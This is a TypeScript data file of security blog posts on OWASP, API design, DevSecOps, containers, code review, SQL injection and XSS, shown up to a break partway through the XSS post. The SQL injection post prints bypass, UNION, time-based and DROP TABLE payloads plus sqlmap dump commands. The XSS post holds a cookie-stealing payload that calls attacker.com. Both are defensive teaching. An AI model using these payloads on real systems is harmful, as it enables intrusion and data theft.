// Blog post data for the platform
import { extendedBlogPosts } from "./blog-data-extended";

export interface BlogPost {
  slug: string;
  title: string;
  excerpt: string;
  content: string;
  date: string;
  author: string;
  category: string;
  tags: string[];
  readTime: string;
  image?: string;
}

export const blogPosts: BlogPost[] = [
  {
    slug: "owasp-top-10-2025",
    title: "OWASP Top 10 2025: What's Changed and How to Prepare",
    excerpt:
      "A comprehensive breakdown of the latest OWASP Top 10 vulnerabilities and actionable steps to secure your applications against them.",
    content: `## Introduction

The OWASP Top 10 remains the gold standard for web application security awareness. The 2025 update reflects evolving threat landscapes, increased API attack surfaces, and the growing complexity of modern applications.

## Key Changes

### 1. Broken Access Control (A01)
Still the #1 vulnerability. Over 94% of applications tested had some form of broken access control. Common issues include:
- IDOR (Insecure Direct Object References)
- Missing function-level access control
- CORS misconfiguration

### 2. Cryptographic Failures (A02)
Previously "Sensitive Data Exposure," this category focuses on failures related to cryptography that lead to data exposure. Key areas:
- Weak algorithms (MD5, SHA1 for passwords)
- Insufficient key management
- Cleartext data transmission

### 3. Injection (A03)
SQL, NoSQL, OS, and LDAP injection remain critical threats. Modern applications face new vectors:
- GraphQL injection
- Template injection (SSTI)
- Expression Language injection

## Mitigation Strategies

1. **Implement Zero Trust Architecture** - Never trust, always verify
2. **Shift Left Security** - Integrate security into CI/CD pipelines
3. **Regular Penetration Testing** - Automated + manual testing
4. **Security Training** - Continuous developer education

## Conclusion

Stay ahead of threats by making security a first-class citizen in your development process.`,
    date: "2025-12-15",
    author: "SCR Team",
    category: "Web Security",
    tags: ["OWASP", "Web Security", "Vulnerabilities"],
    readTime: "8 min read",
  },
  {
    slug: "secure-api-design-patterns",
    title: "Secure API Design Patterns: A Developer's Guide",
    excerpt:
      "Learn the essential security patterns every API developer should implement, from authentication to rate limiting.",
    content: `## Building Secure APIs

APIs are the backbone of modern applications, but they're also prime targets for attackers. This guide covers essential security patterns.

## Authentication Patterns

### JWT Best Practices
- Use short-lived access tokens (15 minutes)
- Implement refresh token rotation
- Store tokens securely (httpOnly cookies)
- Validate all claims

### API Key Management
- Never expose keys in client-side code
- Implement key rotation policies
- Use different keys per environment

## Authorization Patterns

### RBAC (Role-Based Access Control)
\`\`\`typescript
const checkPermission = (user: User, resource: string, action: string) => {
  const permissions = rolePermissions[user.role];
  return permissions?.includes(\`\${resource}:\${action}\`) ?? false;
};
\`\`\`

### ABAC (Attribute-Based Access Control)
More granular than RBAC, considering user attributes, resource attributes, and environmental conditions.

## Rate Limiting

Implement multi-tier rate limiting:
- Per-user limits
- Per-IP limits
- Global limits
- Endpoint-specific limits

## Input Validation

Always validate and sanitize input at the API boundary. Use schema validation libraries like Zod or Joi.

## Conclusion

Security is not a feature—it's a requirement. Build these patterns into your API from day one.`,
    date: "2025-11-28",
    author: "SCR Team",
    category: "API Security",
    tags: ["API", "Authentication", "Authorization", "Design Patterns"],
    readTime: "10 min read",
  },
  {
    slug: "supply-chain-security",
    title: "Software Supply Chain Security: Defending Against Modern Threats",
    excerpt:
      "How to protect your applications from supply chain attacks targeting dependencies, build pipelines, and deployment processes.",
    content: `## The Supply Chain Threat

Supply chain attacks have increased by 742% over the past three years. From SolarWinds to Log4Shell, these attacks demonstrate the devastating impact of compromised dependencies.

## Attack Vectors

### Dependency Confusion
Attackers publish malicious packages with names similar to internal packages on public registries.

### Compromised Maintainers
Social engineering attacks targeting package maintainers to inject malicious code.

### Build Pipeline Attacks
Compromising CI/CD infrastructure to inject malicious code during the build process.

## Defense Strategies

### 1. Dependency Management
- Use lockfiles (package-lock.json, yarn.lock)
- Pin dependency versions
- Regularly audit dependencies
- Use tools like Snyk, Dependabot

### 2. SBOM (Software Bill of Materials)
Generate and maintain SBOMs for all software:
\`\`\`bash
npx @cyclonedx/cyclonedx-npm --output-file sbom.json
\`\`\`

### 3. Code Signing
Sign all releases and verify signatures during deployment.

### 4. Build Reproducibility
Ensure builds are deterministic and reproducible across environments.

## Conclusion

Supply chain security requires a holistic approach combining tooling, processes, and culture.`,
    date: "2025-11-10",
    author: "SCR Team",
    category: "Supply Chain",
    tags: ["Supply Chain", "Dependencies", "DevSecOps"],
    readTime: "7 min read",
  },
  {
    slug: "zero-trust-architecture",
    title: "Implementing Zero Trust Architecture: A Practical Guide",
    excerpt:
      "Move beyond perimeter-based security with a practical implementation guide for Zero Trust Architecture in modern applications.",
    content: `## What is Zero Trust?

Zero Trust is a security model based on the principle "never trust, always verify." It eliminates implicit trust and continuously validates every stage of digital interaction.

## Core Principles

1. **Verify Explicitly** - Always authenticate and authorize based on all available data points
2. **Use Least Privilege Access** - Limit user access with just-in-time and just-enough-access
3. **Assume Breach** - Minimize blast radius and segment access

## Implementation Steps

### Identity Verification
- Multi-factor authentication (MFA)
- Conditional access policies
- Continuous authentication

### Network Segmentation
- Micro-segmentation
- Software-defined perimeters
- Encrypted communications

### Device Compliance
- Device health checks
- Endpoint detection and response
- Mobile device management

## Monitoring and Analytics

Deploy comprehensive logging and monitoring:
- User behavior analytics (UBA)
- Security Information and Event Management (SIEM)
- Automated incident response

## Conclusion

Zero Trust is a journey, not a destination. Start with identity, expand to network, and iterate continuously.`,
    date: "2025-10-25",
    author: "SCR Team",
    category: "Architecture",
    tags: ["Zero Trust", "Architecture", "Identity", "Network Security"],
    readTime: "9 min read",
  },
  {
    slug: "container-security-best-practices",
    title: "Container Security Best Practices for Production",
    excerpt:
      "Secure your containerized applications from image building to runtime with these battle-tested practices.",
    content: `## Container Security Lifecycle

Security must be addressed at every stage of the container lifecycle: build, ship, and run.

## Build Phase

### Minimal Base Images
Use minimal base images to reduce attack surface:
\`\`\`dockerfile
FROM node:20-alpine AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production
COPY . .
RUN npm run build

FROM node:20-alpine
RUN addgroup -g 1001 -S appgroup && adduser -S appuser -u 1001
COPY --from=builder /app/dist ./dist
COPY --from=builder /app/node_modules ./node_modules
USER appuser
EXPOSE 3000
CMD ["node", "dist/index.js"]
\`\`\`

### Image Scanning
Scan images for vulnerabilities before pushing:
\`\`\`bash
docker scout cves myimage:latest
trivy image myimage:latest
\`\`\`

## Ship Phase

- Sign container images
- Use private registries
- Implement image promotion policies

## Run Phase

- Read-only file systems
- No privileged containers
- Resource limits
- Network policies
- Runtime security monitoring

## Conclusion

Container security is a shared responsibility between development and operations teams.`,
    date: "2025-10-10",
    author: "SCR Team",
    category: "Container Security",
    tags: ["Docker", "Kubernetes", "Containers", "DevSecOps"],
    readTime: "6 min read",
  },
  {
    slug: "devsecops-complete-guide-2025",
    title: "DevSecOps: The Complete Guide 2025-2026",
    excerpt:
      "Master DevSecOps with comprehensive practices, automation strategies, real-world examples, and the latest trends shaping secure development in 2025.",
    content: `## What is DevSecOps?

DevSecOps integrates security practices throughout the entire software development lifecycle (SDLC). Rather than treating security as an afterthought, it becomes a shared responsibility from planning through production.

**Key Statistics:**
- 84% of organizations view DevSecOps as critical (Gartner, 2025)
- Companies implementing DevSecOps reduce time-to-remediate vulnerabilities by 60%
- Security bugs detected early cost 5-10x less to fix than in production

## The DevSecOps Pipeline Lifecycle

### Phase 1: Plan & Design
- Threat modeling (STRIDE, PASTA)
- Security requirements definition
- Risk assessment
- Architecture review

### Phase 2: Develop
- Secure coding practices
- IDE security plugins
- Pre-commit hooks
- Dependency scanning (SCA)

### Phase 3: Test
- SAST (Static Application Security Testing)
- DAST (Dynamic Application Security Testing)
- Container scanning
- API security testing

### Phase 4: Build & Deploy
- Image scanning
- SBOM generation
- Infrastructure-as-Code scanning
- Secrets management

### Phase 5: Operate & Monitor
- Runtime security monitoring
- Log aggregation & analysis
- Vulnerability management
- Incident response

---

## DevSecOps Implementation Architecture

\`\`\`
┌─────────────────────────────────────────────────────────────────┐
│                    Development Pipeline                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                   │
│  Code Commit → SAST → SCA → Build → Container Scan → Registry   │
│                │         │         │         │                  │
│                └─ Security Checks ─────────────                 │
│                                                                   │
│  Deploy → DAST → WAF Rules → Runtime Monitoring → Alert → Action │
│            │         │            │                              │
│            └─────── Continuous Security ──────────────           │
│                                                                   │
└─────────────────────────────────────────────────────────────────┘
\`\`\`

---

## 1. Secure Coding & Shift-Left Security

### Principle
Move security testing to the earliest stages of development.

### Implementation Example

**Bad Practice:**
\`\`\`javascript
// Finding SQL injection vulnerability in production
const query = \`SELECT * FROM users WHERE id = \${userId}\`;
db.query(query);
\`\`\`

**Better Practice:**
\`\`\`javascript
// Pre-commit hook catches vulnerability
const query = \`SELECT * FROM users WHERE id = ?\`;
db.query(query, [userId]); // Parameterized query

// SonarQube catches before commit
// ESLint security plugin: eslint-plugin-security
\`\`\`

### Tools for Shift-Left:
- **Pre-commit hooks**: Husky + custom security checks
- **IDE plugins**: SonarLint, Checkmarx
- **SAST**: SonarQube, Snyk, Semgrep

---

## 2. Dependency & Supply Chain Security

**Challenge:** 77% of vulnerabilities come from third-party libraries (NIST)

### Implementation

\`\`\`yaml
# .github/workflows/dependency-check.yml
name: Dependency Security Check

on: [pull_request]

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Run Snyk scan
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: \${{ secrets.SNYK_TOKEN }}
          
      - name: Generate SBOM
        run: npm sbom --format cyclonedx > sbom.json
        
      - name: Check licenses
        run: npm audit --json > audit.json
\`\`\`

### Current Trend (2025)
- **Zero-trust supply chain**: Verify every artifact
- **SBOM adoption**: CycloneDX, SPDX standards mandatory
- **Software transparency**: OpenSSF Scorecard

---

## 3. Container & Infrastructure Security

### Dockerfile Best Practices

\`\`\`dockerfile
# Multi-stage build minimizes attack surface
FROM node:20-alpine AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production && npm cache clean --force

FROM node:20-alpine
RUN apk add --no-cache dumb-init

# Non-root user
RUN addgroup -g 1001 -S nodegroup && \\
    adduser -S nodeuser -u 1001 -G nodegroup

COPY --from=builder --chown=nodeuser:nodegroup /app .

# Security hardening
RUN chmod -R 755 /app && \\
    echo "node:*:1001:1001::/app:/sbin/nologin" >> /etc/passwd

HEALTHCHECK --interval=30s --timeout=3s --start-period=40s \\
  CMD node healthcheck.js

USER nodeuser
EXPOSE 3000
ENTRYPOINT ["/usr/bin/dumb-init", "--"]
CMD ["node", "dist/server.js"]
\`\`\`

### Container Scanning Pipeline

\`\`\`bash
# Scan before registry push
trivy image --severity HIGH,CRITICAL myapp:latest

docker scout cves myapp:latest

syft myapp:latest > sbom.json
\`\`\`

### Kubernetes Security

\`\`\`yaml
apiVersion: v1
kind: Pod
metadata:
  name: app
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1001
    fsReadOnlyRootFilesystem: true
  containers:
  - name: app
    image: myapp:latest
    securityContext:
      allowPrivilegeEscalation: false
      capabilities:
        drop: ["ALL"]
    resources:
      limits:
        memory: "256Mi"
        cpu: "500m"
    livenessProbe:
      httpGet:
        path: /health
        port: 3000
    volumeMounts:
    - name: tmp
      mountPath: /tmp
  volumes:
  - name: tmp
    emptyDir: {}
  networkPolicy:
    backend-isolation: true
\`\`\`

---

## 4. CI/CD Pipeline Security

### Comprehensive GitHub Actions Workflow

\`\`\`yaml
name: Secure CI/CD Pipeline

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

env:
  REGISTRY: ghcr.io
  IMAGE_NAME: \${{ github.repository }}

jobs:
  security-checks:
    runs-on: ubuntu-latest
    steps:
      # 1. Code checkout
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      
      # 2. SAST - Static analysis
      - name: Run SonarQube
        uses: SonarSource/sonarcloud-github-action@master
        env:
          GITHUB_TOKEN: \${{ secrets.GITHUB_TOKEN }}
          SONAR_TOKEN: \${{ secrets.SONAR_TOKEN }}
      
      # 3. Dependency scanning
      - name: Snyk dependency scan
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: \${{ secrets.SNYK_TOKEN }}
      
      # 4. Secret scanning
      - name: Detect secrets
        uses: trufflesecurity/trufflehog@main
        with:
          path: ./
          base: \${{ github.event.repository.default_branch }}
          head: HEAD
      
      # 5. SBOM generation
      - name: Generate SBOM
        run: npm sbom --format cyclonedx > sbom.json
      
      # 6. Lint security
      - name: Security lint
        run: npm run lint:security
  
  build-and-push:
    needs: security-checks
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write
    steps:
      - uses: actions/checkout@v4
      
      # 7. Build image
      - name: Build Docker image
        run: docker build -t \${{ env.IMAGE_NAME }}:latest .
      
      # 8. Scan image
      - name: Scan image with Trivy
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: \${{ env.IMAGE_NAME }}:latest
          format: 'sarif'
          output: 'trivy-results.sarif'
      
      # 9. Upload SARIF
      - name: Upload Trivy results
        uses: github/codeql-action/upload-sarif@v2
        with:
          sarif_file: 'trivy-results.sarif'
      
      # 10. Push to registry (only on main)
      - name: Push image
        if: github.ref == 'refs/heads/main'
        run: docker push \${{ env.IMAGE_NAME }}:latest
  
  dast:
    needs: build-and-push
    runs-on: ubuntu-latest
    steps:
      - name: OWASP ZAP scan
        uses: zaproxy/action-baseline@v0.7.0
        with:
          target: 'https://staging.example.com'
          rules_file_name: '.zap/rules.tsv'
          cmd_options: '-a'
\`\`\`

---

## 5. Secrets Management

### Implementation

\`\`\`bash
# Never commit secrets
git-secrets --install
echo 'providers:
  - type: File
    filename: .env' >> ~/.gitsecrets/patterns

# Use environment-based secrets
export API_KEY=\$(aws secretsmanager get-secret-value \\
  --secret-id prod/api-key \\
  --region us-east-1 \\
  --query SecretString \\
  --output text)

# Rotate secrets regularly
aws secretsmanager rotate-secret --secret-id prod/api-key
\`\`\`

### Tools
- AWS Secrets Manager
- HashiCorp Vault
- GitHub Secrets
- 1Password for Teams

---

## 6. Monitoring & Incident Response

### Real-time Security Monitoring

\`\`\`javascript
// Application security monitoring
const securityMonitoring = {
  trackFailedAuth: (username, ip) => {
    if (failureCount[ip] > 5) {
      rateLimit(ip);
      alertSecurityTeam(\`Brute force attempt from \${ip}\`);
    }
  },
  
  trackAnomalies: (event) => {
    if (event.severity > THRESHOLD) {
      createIncident(event);
      notifyOnCall();
    }
  },
  
  auditLog: {
    userAction: (userId, action, resource, timestamp) => {
      logToSIEM({
        user_id: userId,
        action,
        resource,
        ip: getClientIP(),
        timestamp,
        status: 'completed'
      });
    }
  }
};
\`\`\`

---

## Current Trends & Future Directions (2025-2026)

### 1. **AI-Powered Security**
- Automated vulnerability detection using ML
- Behavioral anomaly detection
- Intelligent threat prediction

### 2. **Zero Trust by Default**
- Remove trust boundaries
- Verify every request
- Least privilege access everywhere

### 3. **Software Supply Chain Security**
- SBOM as standard
- Artifact verification
- OpenSSF Scorecard adoption

### 4. **Cloud-Native Security**
- Runtime security (Falco, Tracee)
- eBPF-based monitoring
- Kubernetes security standards

### 5. **FinOps + SecOps**
- Cost of security incidents
- ROI-driven security investments
- Budget optimization

---

## Key DevSecOps Metrics

Track these metrics to measure DevSecOps maturity:

| Metric | Target | Industry Benchmark |
|--------|--------|-------------------|
| Mean Time to Remediate (MTTR) | < 30 days | 90 days |
| High Severity Vulnerabilities | 0 | 5-10 per app |
| Security Issues in Code Review | > 80% | 50% |
| Incident Response Time | < 1 hour | 4-6 hours |
| Security Training Completion | 100% | 60% |

---

## Getting Started: 5-Step Implementation Plan

### Month 1-2: Foundation
1. [ ] Establish security champions
2. [ ] Implement SAST in CI/CD
3. [ ] Set up dependency scanning
4. [ ] Create security guidelines

### Month 3-4: Automation
1. [ ] Add automated testing
2. [ ] Implement container scanning
3. [ ] Set up secret management
4. [ ] Enable security monitoring

### Month 5-6: Maturity
1. [ ] DAST integration
2. [ ] Threat modeling process
3. [ ] Incident response drills
4. [ ] Advanced SBOM/supply chain

---

## Conclusion

DevSecOps is not a tool or framework—it's a cultural shift that makes security everyone's responsibility. Start small, automate relentlessly, and iterate based on your organization's risk profile.

**Resources:**
- NIST Cyber Security Framework
- OWASP DevSecOps Top 10
- Cloud Security Alliance guidelines
- OpenSSF Best Practices`,
    date: "2026-02-15",
    author: "SCR Team",
    category: "DevSecOps",
    tags: ["DevSecOps", "CI/CD", "Security Automation", "Best Practices", "2025 Trends"],
    readTime: "15 min read",
  },
  {
    slug: "secure-code-review-checklist",
    title: "The Ultimate Secure Code Review Checklist",
    excerpt:
      "A comprehensive checklist for conducting effective secure code reviews that catch vulnerabilities before they reach production.",
    content: `## Why Secure Code Reviews Matter

Code reviews are your last line of defense before vulnerabilities reach production. A structured approach ensures consistency and thoroughness.

## The Checklist

### Input Validation
- [ ] All user inputs are validated
- [ ] Input length limits are enforced
- [ ] Special characters are properly handled
- [ ] File uploads are validated (type, size, content)

### Authentication
- [ ] Passwords are properly hashed (bcrypt, argon2)
- [ ] Session management is secure
- [ ] MFA is implemented where appropriate
- [ ] Account lockout is configured

### Authorization
- [ ] Access controls are enforced server-side
- [ ] IDOR vulnerabilities are addressed
- [ ] Principle of least privilege is followed
- [ ] Role-based access is properly implemented

### Data Protection
- [ ] Sensitive data is encrypted at rest
- [ ] TLS is enforced for data in transit
- [ ] PII handling follows regulations
- [ ] Secrets are not hardcoded

### Error Handling
- [ ] Errors don't expose sensitive information
- [ ] Stack traces are not shown to users
- [ ] Logging captures security events
- [ ] Error messages are user-friendly

### Dependencies
- [ ] Known vulnerabilities are addressed
- [ ] Dependencies are up to date
- [ ] Unused dependencies are removed
- [ ] License compliance is verified

## Conclusion

Use this checklist as a starting point and customize it for your organization's specific needs.`,
    date: "2025-09-20",
    author: "SCR Team",
    category: "Code Review",
    tags: ["Code Review", "Checklist", "Best Practices"],
    readTime: "5 min read",
  },
  {
    slug: "sql-injection-prevention-guide",
    title: "SQL Injection Prevention: Complete Guide with Code Examples",
    excerpt: "Master SQL injection attacks and learn proven prevention techniques. Includes vulnerable code examples, parameterized queries, and real-world breach analysis.",
    content: `## What is SQL Injection?

SQL injection is one of the most critical web vulnerabilities, affecting 39% of web applications according to OWASP. It occurs when an attacker inserts malicious SQL code into input fields, allowing them to manipulate database queries.

### Real-World Impact
- **Target (2013)**: Lost 40 million credit card numbers via SQL injection
- **Healthcare.gov (2015)**: Exposed 21 million ID numbers
- **Equifax (2017)**: 147 million records compromised

---

## Types of SQL Injection

### 1. Error-Based SQL Injection
Displays database errors to extract information.

```sql
-- Vulnerable Query
SELECT * FROM users WHERE username = 'admin' AND password = 'pass'

-- Attack Input
username: admin' OR '1'='1
password: anything

-- Executed Query (bypasses authentication)
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'anything'
```

### 2. Union-Based SQL Injection
Merges attacker's query with original query.

```sql
-- Vulnerable: Get product details
SELECT product_id, product_name, price FROM products WHERE id = 1

-- Attack Input
id: 1 UNION SELECT user_id, username, password FROM users--

-- Executed (leaks user credentials)
SELECT product_id, product_name, price FROM products WHERE id = 1
UNION SELECT user_id, username, password FROM users--
```

### 3. Blind SQL Injection
No direct error feedback. Attacker infers data via response times/behavior.

\`\`\`sql
-- Vulnerable login
SELECT * FROM users WHERE email = 'admin@mail.com' AND password = 'pass'

-- Time-based blind injection
-- email: admin@mail.com' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
-- password: anything

-- If response takes 5+ seconds, injection succeeded
\`\`\`

### 4. Stacked Queries
Executes multiple SQL statements.

\`\`\`sql
-- Vulnerable with stacked query support
user_id: 1; DROP TABLE users;--

-- Executes:
SELECT * FROM users WHERE id = 1; 
DROP TABLE users;--
\`\`\`

---

## Vulnerable Code Examples

### Python (Flask - VULNERABLE)
\`\`\`python
from flask import Flask, request
import sqlite3

app = Flask(__name__)

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    # VULNERABLE: String concatenation
    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
    cursor.execute(query)
    
    user = cursor.fetchone()
    if user:
        return "Login successful!"
    return "Invalid credentials"
\`\`\`

### Node.js (Express - VULNERABLE)
\`\`\`javascript
const express = require('express');
const mysql = require('mysql');

const app = express();
const conn = mysql.createConnection({
  host: 'localhost',
  user: 'root',
  password: 'pass',
  database: 'appdb'
});

app.post('/search', (req, res) => {
  const searchTerm = req.body.search;
  
  // VULNERABLE: Direct query string interpolation
  const query = 'SELECT * FROM products WHERE name LIKE \'%' + searchTerm + '%\'';
  
  conn.query(query, (err, results) => {
    if (err) throw err;
    res.json(results);
  });
});
\`\`\`

### Java (JDBC - VULNERABLE)
\`\`\`java
public User authenticateUser(String username, String password) {
    String query = "SELECT * FROM users WHERE username = '" + username + 
                   "' AND password = '" + password + "'";
    
    // VULNERABLE: String concatenation
    Statement stmt = connection.createStatement();
    ResultSet rs = stmt.executeQuery(query);
    
    if (rs.next()) {
        return new User(rs);
    }
    return null;
}
\`\`\`

---

## Secure Implementation

### Solution 1: Parameterized Queries (BEST)

**Python (Secure)**
\`\`\`python
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    # SECURE: Parameterized query
    query = "SELECT * FROM users WHERE username = ? AND password = ?"
    cursor.execute(query, (username, password))
    
    user = cursor.fetchone()
    return "Login successful!" if user else "Invalid credentials"
\`\`\`

**Node.js (Secure)**
\`\`\`javascript
app.post('/search', (req, res) => {
  const searchTerm = req.body.search;
  
  // SECURE: Parameterized query with ?
  const query = 'SELECT * FROM products WHERE name LIKE ?';
  
  conn.query(query, [\`%\${searchTerm}%\`], (err, results) => {
    if (err) throw err;
    res.json(results);
  });
});
\`\`\`

**Java (Secure)**
\`\`\`java
public User authenticateUser(String username, String password) {
    // SECURE: Prepared statement
    String query = "SELECT * FROM users WHERE username = ? AND password = ?";
    PreparedStatement stmt = connection.prepareStatement(query);
    
    stmt.setString(1, username);
    stmt.setString(2, password);
    
    ResultSet rs = stmt.executeQuery();
    
    if (rs.next()) {
        return new User(rs);
    }
    return null;
}
\`\`\`

### Solution 2: ORMs (Object-Relational Mapping)

**Sequelize (Node.js)**
\`\`\`javascript
const User = sequelize.define('User', {
  username: DataTypes.STRING,
  password: DataTypes.STRING
});

// Safe from SQL injection
const user = await User.findOne({
  where: { username: inputUsername, password: inputPassword }
});
\`\`\`

**Hibernate (Java)**
\`\`\`java
@Entity
public class User {
    @Id private Long id;
    private String username;
    private String password;
}

// Safe from SQL injection
User user = session.createQuery(
  "FROM User WHERE username = :username AND password = :password", User.class)
  .setParameter("username", username)
  .setParameter("password", password)
  .uniqueResult();
\`\`\`

---

## SQL Injection Prevention Checklist

- [ ] Use parameterized queries/prepared statements
- [ ] Implement stored procedures (with parameterization)
- [ ] Use ORM frameworks when possible
- [ ] Input validation (whitelist allowed characters)
- [ ] Principle of least privilege (DB user permissions)
- [ ] Escape special characters if parameterization is unavailable
- [ ] Use Web Application Firewall (WAF) rules
- [ ] Enable SQL error suppression in production
- [ ] Implement comprehensive logging/monitoring
- [ ] Regular penetration testing
- [ ] Security code reviews
- [ ] Update database drivers/libraries regularly

---

## Detection & Testing

### Using OWASP ZAP
\`\`\`bash
# Automated SQL injection scanning
zaproxy.sh -cmd -quickurl http://target.com -quickout report.html
\`\`\`

### Burp Suite Testing
1. Burp Scanner (Automated detection)
2. Intruder (Manual payload testing)
3. Repeater (Test payloads: ' OR '1'='1)

### SQLMap (Powerful CLI Tool)
\`\`\`bash
# Detect SQL injection vulnerabilities
sqlmap -u "http://target.com/products?id=" --dbs

# Extract data
sqlmap -u "http://target.com/products?id=" --tables --dump
\`\`\`

---

## Web Application Firewall (WAF) Rules

\`\`\`
# Detect common SQL injection patterns
SecRule ARGS "@rx (?i:union.*select|select.*from|insert.*into|delete.*from|drop|exec|execute|declare)"
\`\`\`

---

## Key Takeaways

1. **Always use parameterized queries** - No exceptions
2. **Input validation is NOT sufficient** - Use as defense-in-depth
3. **Database user should have minimal privileges** - Prevent data exfiltration
4. **Monitor for suspicious database activity** - Catch attacks early
5. **Regular security testing** - Automated scans + manual testing

---

## Resources

- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- CWE-89: SQL Injection
- NIST Secure Coding Standards
- PortSwigger SQL Injection Guide`,
    date: "2026-02-16",
    author: "SCR Team",
    category: "Web Security",
    tags: ["SQL Injection", "Prevention", "Database Security", "Vulnerabilities"],
    readTime: "12 min read",
  },
  {
    slug: "xss-cross-site-scripting-prevention",
    title: "XSS (Cross-Site Scripting) Prevention: Complete Guide 2025",
    excerpt: "Learn to prevent Stored, Reflected, and DOM-based XSS attacks. Includes real examples, OWASP prevention strategies, and Content Security Policy implementation.",
    content: `## What is Cross-Site Scripting (XSS)?

XSS is a critical vulnerability affecting 36% of web applications. Attackers inject malicious JavaScript code that executes in victims' browsers, allowing theft of sensitive data, session hijacking, and credential harvesting.

### Real-World Impact
- **eBay (2015)**: XSS in image search allowed session hijacking
- **Twitter (2014)**: XSS in profile names led to account takeovers
- **MySpace (2005)**: Samy worm infected 1 million profiles

---

## Types of XSS Attacks

### 1. Stored XSS (Persistent)
Malicious script is stored in database and executed for all users.

\`\`\`html
<!-- Blog comment form (VULNERABLE) -->
<textarea name="comment" placeholder="Add comment..."></textarea>

<!-- Attacker submits -->
<img src=x onerror="fetch('http://attacker.com/steal?cookie=' + document.cookie)">

<!-- Script stored in DB and executed for every viewer -->
\`\`\`

### 2. Reflected XSS (Non-Persistent)
Malicious script is reflected in URL parameters.

\`\`\`
<!-- Vulnerable search -->
http://store.com/search?q=<img src=x onerror=alert('XSS')>

<!-- Server responds -->
Search results for: <img src=x onerror=alert('XSS')>

<!-- Script executes in victim's browser -->
\`\`\`

### 3. DOM-Based XSS
Script modifies DOM using untrusted data.

\`\`\`javascript
// VULNERABLE: Using innerHTML with user input
function displayUserProfile() {
  const username = new URLSearchParams(location.search).get('name');
  document.getElementById('profile').innerHTML = \`Welcome, \${username}\`;
}

// Attacker URL
http://site.com/?name=<img src=x onerror=alert('XSS')>

// Executed in browser
\`\`\`

---

## XSS Prevention Techniques

### Method 1: Input Encoding (Escaping)

**HTML Entity Encoding**
\`\`\`javascript
function encodeHTML(text) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#39;'
  };
  return text.replace(/[&<>"']/g, char => map[char]);
}

// Usage
const userInput = '<img src=x onerror=alert("XSS")>';
const safe = encodeHTML(userInput);
// Result: &lt;img src=x onerror=alert(&quot;XSS&quot;)&gt;
\`\`\`

### Method 2: Content Security Policy (CSP)

\`\`\`html
<!-- Strict CSP Header -->
<meta http-equiv="Content-Security-Policy" 
  content="default-src 'self'; 
           script-src 'self' 'unsafe-inline';
           style-src 'self' https://fonts.googleapis.com;">

<!-- OR HTTP Header -->
Content-Security-Policy: default-src 'self'; script-src 'nonce-{randomvalue}'
\`\`\`

**Node.js Implementation**
\`\`\`javascript
const helmet = require('helmet');
const express = require('express');

const app = express();

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "'unsafe-inline'"],
    styleSrc: ["'self'", "https://fonts.googleapis.com"],
    imgSrc: ["'self'", "data:", "https:"],
    connectSrc: ["'self'", "https://api.example.com"],
  },
}));
\`\`\`

### Method 3: Use Safe DOM Methods

\`\`\`javascript
// VULNERABLE
element.innerHTML = userInput;

// SECURE - Use textContent for text
element.textContent = userInput;

// SECURE - Use createElement for dynamic elements
const div = document.createElement('div');
div.textContent = userInput;
element.appendChild(div);

// SECURE - DOMPurify library
element.innerHTML = DOMPurify.sanitize(userInput);
\`\`\`

### Method 4: Framework-Level Protection

**React (Auto-escapes by default)**
\`\`\`jsx
// SAFE: React escapes text content automatically
function ShowUserComment({ comment }) {
  return <div>{comment}</div>;
  // <img src=x onerror=alert('XSS')> displayed as text
}

// Use innerHTMLonly when necessary with sanitization
function DangerousComponent({ html }) {
  const sanitized = DOMPurify.sanitize(html);
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}
\`\`\`

**Angular (Built-in Sanitization)**
\`\`\`typescript
import { DomSanitizer } from '@angular/platform-browser';

@Component({
  selector: 'app-user',
  template: '<div [innerHTML]="userInput"></div>'
})
export class UserComponent {
  constructor(private sanitizer: DomSanitizer) {}
  
  // Angular automatically sanitizes
  userInput = this.userInput;
}
\`\`\`

---

## Code Examples: Vulnerable vs Secure

### Node.js Express

**VULNERABLE**
\`\`\`javascript
app.get('/user/:id', (req, res) => {
  const userId = req.params.id;
  res.send(\`<h1>User Profile: \${userId}</h1>\`);
});
// URL: /user/<img src=x onerror=alert('XSS')>
\`\`\`

**SECURE**
\`\`\`javascript
const escapeHtml = require('escape-html');

app.get('/user/:id', (req, res) => {
  const userId = req.params.id;
  res.send(\`<h1>User Profile: \${escapeHtml(userId)}</h1>\`);
});
\`\`\`

### Python Flask

**VULNERABLE**
\`\`\`python
from flask import Flask, request

app = Flask(__name__)

@app.route('/search')
def search():
    query = request.args.get('q')
    return f'<h1>Results for: {query}</h1>'
\`\`\`

**SECURE**
\`\`\`python
from flask import Flask, request, render_template_string
from markupsafe import escape

@app.route('/search')
def search():
    query = request.args.get('q')
    return f'<h1>Results for: {escape(query)}</h1>'
\`\`\`

---

## XSS Prevention Checklist

- [ ] Encode all user input before displaying
- [ ] Use templating engines with auto-escaping
- [ ] Implement Content Security Policy (CSP)
- [ ] Use frameworks with built-in XSS protection
- [ ] Sanitize HTML when necessary (DOMPurify, Bleach)
- [ ] Validate input server-side (not just client-side)
- [ ] Use HttpOnly and Secure flags on cookies
- [ ] Implement X-XSS-Protection header
- [ ] Regular security testing (OWASP ZAP, Burp)
- [ ] Security code reviews
